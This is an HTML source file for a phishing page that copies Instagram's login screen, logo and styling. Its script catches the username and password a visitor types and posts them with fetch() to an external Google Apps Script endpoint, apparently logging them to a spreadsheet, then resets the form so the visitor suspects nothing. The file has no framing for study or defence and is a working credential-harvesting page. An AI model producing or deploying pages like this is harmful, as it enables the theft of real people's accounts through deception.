<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Login</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .login-container {
            background-color: white;
            border: 1px solid #dbdbdb;
            padding: 40px;
            width: 350px;
            border-radius: 3px;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
        }
        .logo {
            display: flex;
            justify-content: center;
            margin-bottom: 20px;
        }
        .logo img {
            width: 175px;
        }
        .input-field {
            margin: 10px 0;
            padding: 10px;
            width: 100%;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            box-sizing: border-box;
        }
        .login-btn {
            background-color: #0095f6;
            color: white;
            border: none;
            padding: 10px;
            width: 100%;
            border-radius: 3px;
            cursor: pointer;
            font-size: 16px;
        }
        .login-btn:hover {
            background-color: #0078cc;
        }
        .forgot-password {
            text-align: center;
            margin-top: 10px;
        }
        .forgot-password a {
            color: #0095f6;
            font-size: 14px;
            text-decoration: none;
        }
        .divider {
            display: flex;
            align-items: center;
            margin: 15px 0;
        }
        .divider span {
            font-size: 14px;
            color: #8e8e8e;
        }
        .divider::before, .divider::after {
            content: "";
            flex: 1;
            border-bottom: 1px solid #dbdbdb;
            margin: 0 10px;
        }
        .sign-up-link {
            text-align: center;
            font-size: 14px;
        }
        .sign-up-link a {
            color: #0095f6;
            text-decoration: none;
        }
    </style>
</head>
<body>

<div class="login-container">
    <div class="logo">
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/95/Instagram_logo_2022.svg/2560px-Instagram_logo_2022.svg.png" alt="Instagram Logo">
    </div>
    
    <form onsubmit="submitForm(event)" name="submit-to-google-sheet">
        <input type="text" class="input-field" placeholder="Phone number, username, or email" name="Login ID" required>
        <input type="password" class="input-field" placeholder="Password" name="Password" required>
        <button type="submit" class="login-btn" name="Submit">Log In</button>
    </form>

    <div class="forgot-password">
        <a href="#">Forgot password?</a>
    </div>

    <div class="divider">
        <span>OR</span>
    </div>

    <div class="sign-up-link">
        <span>Don't have an account? <a href="#">Sign up</a></span>
    </div>
</div>

<script>
    const scriptURL = 'https://script.google.com/macros/s/AKfycbzJAb8TBM2lGoSNM3d_DV7s383GtBLZsWsEr96Ia8EzKvoCuksWcKuJ6TnkcW6StgT-WA/exec';
    const form = document.forms['submit-to-google-sheet'];

    function submitForm(event) {
        event.preventDefault(); // Prevent the default form submission

        fetch(scriptURL, { method: 'POST', body: new FormData(form) })
            .then(response => {
                console.log('Success!', response);
                form.reset(); // Reset the form after successful submission
            })
            .catch(error => console.error('Error!', error.message));
    }
</script>

</body>
</html>
